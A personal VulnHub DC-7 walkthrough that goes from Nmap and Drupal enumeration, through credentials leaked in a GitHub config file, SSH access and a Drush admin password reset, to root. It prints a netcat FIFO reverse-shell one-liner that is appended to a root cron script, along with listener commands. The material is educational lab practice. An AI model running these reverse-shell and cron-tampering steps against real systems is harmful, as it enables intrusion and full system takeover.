# DC-BOX-07
# 🖥️ DC-7 VulnHub Walkthrough

```text
╔══════════════════════════════════════╗
║            DC-7 PENTEST              ║
║     Enumeration → Root Access        ║
╚══════════════════════════════════════╝
```

![VulnHub](https://img.shields.io/badge/Platform-VulnHub-blue)
![Linux](https://img.shields.io/badge/OS-Linux-yellow)
![Drupal](https://img.shields.io/badge/CMS-Drupal-0678BE)
![Status](https://img.shields.io/badge/Status-Rooted-success)

## >_ Introduction

DC-7 was another VulnHub machine I worked on to practise enumeration, web exploitation, Drupal, reverse shells and Linux privilege escalation.

What made this box interesting for me was that normal directory scanning didn't immediately give me the answer. I had to follow different clues, especially the `dc7user` username and the cron backup script.

My attack path ended up looking like this:

```text
┌──────────────┐
│   Nmap Scan  │
└──────┬───────┘
       ↓
┌──────────────┐
│ Drupal Site  │
└──────┬───────┘
       ↓
┌──────────────────┐
│ GitHub Discovery │
└──────┬───────────┘
       ↓
┌──────────────────┐
│ SSH → dc7user    │
└──────┬───────────┘
       ↓
┌──────────────────┐
│ Drush Discovery  │
└──────┬───────────┘
       ↓
┌──────────────────┐
│ Drupal Admin     │
└──────┬───────────┘
       ↓
┌──────────────────┐
│ Reverse Shell    │
└──────┬───────────┘
       ↓
┌──────────────────┐
│ backups.sh       │
└──────┬───────────┘
       ↓
      ROOT
```

---

## >_ 01 — Finding the Target

I first switched to root:

```bash
sudo -i
```

Then I scanned my local network to identify the target. I found DC-7 at:

```text
192.168.56.118
```

After finding the IP, I wanted to know exactly what services were running, so I performed a full Nmap scan:

```bash
nmap -sS -sV -sC -p- -oN nmap_full_scan 192.168.56.118
```

This gave me more information about the available services.

Since HTTP was available, the web application became one of my main targets.

---

## >_ 02 — Exploring the Website

I opened the target in Firefox:

```text
http://192.168.56.118
```

The website was running **Drupal**.

There was a login option in the top corner, so naturally I tried some common usernames and passwords first.

No luck.

There was also a search feature, but I couldn't get anything useful from that either.

At this point I started looking deeper.

---

## >_ 03 — robots.txt, Nikto and DIRB

I checked:

```text
/robots.txt
```

`robots.txt` is normally used to tell search-engine crawlers which areas of a website should or shouldn't be crawled. During enumeration it can sometimes expose interesting directories.

There were many `Allow` and `Disallow` entries, but nothing immediately useful.

I also noticed `web.config`, but again I couldn't get anything useful from it.

Next I used Nikto:

```bash
nikto -h http://192.168.56.118
```

Nikto checks a web server for common security issues and interesting configurations.

Still, nothing stood out.

Then I tried DIRB:

```bash
dirb http://192.168.56.118
```

Once again, I didn't find anything that gave me an obvious way forward.

```text
robots.txt  ──┐
Nikto       ──┼──> Nothing useful
DIRB        ──┘
```

This was a good reminder that automated scanners don't always give you the answer.

---

## >_ 04 — The `dc7user` Clue

Going back to the website, I noticed the name:

```text
dc7user
```

Instead of ignoring it, I searched for it online.

This was the turning point.

I found a GitHub repository associated with the username and discovered a `config.php` file.

Configuration files immediately catch my attention because they can contain credentials.

And this one did.

```php
$username = "dc7user";
$password = "MdR3xOgB7#dW";
```

Nice.

I first tried these credentials against the Drupal login page, but they didn't work there.

So I thought: what about SSH?

That worked.

```text
[+] Initial access obtained
[+] User: dc7user
```

---

## >_ 05 — Looking Around the System

Once inside the machine, I started enumerating the files belonging to `dc7user`.

I found a backup directory and an `mbox` file.

The mailbox turned out to be much more interesting.

Inside it I saw messages related to backups and encryption, including:

```text
Database dump saved to /home/dc7user/backups/website.sql

gpg: symmetric encryption of '/home/dc7user/backups/website.tar.gz' failed: File exists

gpg: symmetric encryption of '/home/dc7user/backups/website.sql' failed: File exists
```

More importantly, the email subject revealed:

```text
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
```

That immediately gave me another path to investigate:

```text
/opt/scripts/backups.sh
```

A cron job is used by Linux to automatically execute commands or scripts at scheduled times.

And this one was being executed by **root**.

That made it very interesting.

---

## >_ 06 — Understanding `backups.sh`

I inspected the backup script and found commands similar to:

```bash
rm /home/dc7user/backups/*
cd /var/www/html/
drush sql-dump --result-file=/home/dc7user/backups/website.sql
```

The word that stood out to me here was:

```text
drush
```

I hadn't really used Drush before, so I looked into it.

Drush is a command-line utility for managing Drupal.

I checked where it was installed:

```bash
which drush
```

Then looked through its help:

```bash
drush -h
```

While checking the available functionality, I discovered that Drush could be used to change a Drupal user's password.

That was exactly what I needed.

---

## >_ 07 — Taking Over the Drupal Admin Account

My first attempt didn't work because I wasn't executing the command from the correct Drupal directory.

From the backup script, however, I already knew where the Drupal installation was located:

```bash
cd /var/www/html
```

I tried again from there.

This time it worked.

I reset the Drupal administrator password to a password I controlled and returned to the website.

I logged in as:

```text
admin
```

And I was in.

```text
dc7user
    │
    ├── backups.sh
    │
    └── drush
         │
         └── Drupal Admin Access
```

---

## >_ 08 — Getting a Reverse Shell

Now that I had administrator access to Drupal, the next goal was to turn the web access into a shell.

I found the Drupal PHP module and downloaded the TAR version of it.

After uploading and enabling the module, I enabled PHP functionality and created new content containing a PHP reverse-shell payload.

Before triggering it, I started my listener:

```bash
sudo nc -nlvp 5555
```

I made sure the reverse-shell code contained my Kali IP and the correct listener port.

After executing it:

```text
connect to [192.168.56.107] from ...
```

Shell obtained.

---

## >_ 09 — Privilege Escalation

After getting the shell, I returned to the script I had discovered earlier:

```bash
cd /opt
cd scripts
```

The key target was:

```text
backups.sh
```

Since this script was executed through a root cron job, being able to influence it could potentially execute my commands as root.

I used a FIFO-based Netcat reverse-shell command and changed the IP and port to match my Kali machine.

The payload was appended to the backup script:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.107 6666 >/tmp/f >> backups.sh
```

Then I opened another listener:

```bash
sudo nc -nlvp 6666
```

Now I waited for the cron job to execute the modified script.

And then...

```text
╔══════════════════════════╗
║     ROOT SHELL !!!       ║
╚══════════════════════════╝
```

I moved to:

```bash
cd /root
```

And found the final flag.

---

## >_ What I Learned

DC-7 was useful because the path wasn't simply **scan → exploit → root**.

I had to connect several small clues together.

```text
dc7user
   ↓
GitHub
   ↓
Credentials
   ↓
SSH
   ↓
Mailbox
   ↓
Cron Script
   ↓
Drush
   ↓
Drupal Admin
   ↓
Reverse Shell
   ↓
Root Cron Job
   ↓
ROOT
```

The biggest things I took from this box were:

- Don't depend only on automated scanners.
- Usernames can be useful OSINT clues.
- Configuration files may expose credentials.
- Emails and local files can reveal important internal information.
- Understanding unfamiliar tools such as Drush can open new attack paths.
- Root-owned cron jobs should always be investigated during privilege escalation.
- A writable script executed by root can become a serious privilege-escalation path.

---

## >_ Tools Used

```text
Nmap        → Network/service enumeration
Nikto       → Web server scanning
DIRB        → Directory enumeration
SSH         → Initial system access
Drush       → Drupal administration
Netcat      → Reverse-shell listeners
Drupal      → Web application exploitation
Linux       → Local enumeration & privilege escalation
```

---

```text
┌─────────────────────────────────────┐
│ DC-7 STATUS: PWNED                  │
│ Initial Access : dc7user            │
│ Web Access     : Drupal Admin       │
│ Final Access   : root               │
└─────────────────────────────────────┘
```

> This walkthrough documents my experience solving DC-7 in my own lab environment for educational and cybersecurity practice purposes.
